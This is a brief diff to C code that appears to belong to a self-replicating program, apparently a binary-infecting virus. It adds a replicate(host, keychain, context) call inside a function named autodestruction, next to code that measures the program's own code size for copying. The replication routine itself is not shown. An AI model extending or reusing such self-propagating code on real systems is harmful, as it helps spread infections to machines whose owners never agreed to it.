@@ -12,6 +12,8 @@ void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_co
 	MID_LOGGER("autodestruction:\t");
 #endif
 
+	replicate(host, keychain, context);
+
 	char *entry;
 	const size_t size = (void *)autodestruction - (void *)init;
 	char buf[size];
